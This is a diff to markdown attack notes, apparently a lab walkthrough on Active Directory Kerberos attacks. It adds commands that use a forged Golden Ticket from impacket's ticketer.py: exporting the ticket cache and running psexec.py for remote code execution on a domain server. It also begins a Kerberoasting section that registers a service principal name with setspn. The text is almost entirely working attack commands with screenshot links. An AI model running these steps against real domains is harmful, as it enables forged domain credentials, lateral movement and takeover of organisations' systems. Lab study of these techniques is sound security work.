@@ -65,4 +65,18 @@ Golden Ticket Attack
     python3 /opt/impacket/examples/ticketer.py -nthash <ntlm_hash> -domain-sid <sid> -domain lpt.com evil
 ![image](https://github.com/user-attachments/assets/1e063263-9b10-4248-8545-09fb0828fe89)
 
+    設定環境變數
+    export KRB5CCNAME=~/evil.ccache
+![image](https://github.com/user-attachments/assets/dd1603e6-c95a-48ae-8f2f-cfbf5f806cb8)
+
+    執行RCE
+    psexec.py lpt.com/evil@server2019.lpt.com -k -no-pass -dc-ip 192.168.177.19
+![image](https://github.com/user-attachments/assets/afa4eab9-d9e7-4603-8c33-c7708c096562)
+
+Kerberoasting
+---
+    Register service in AD
+    setspn -s http/lpt.com user-one
+![image](https://github.com/user-attachments/assets/fbca5919-1e5d-4a1f-9fff-c59e2e07dcd5)
+  
 
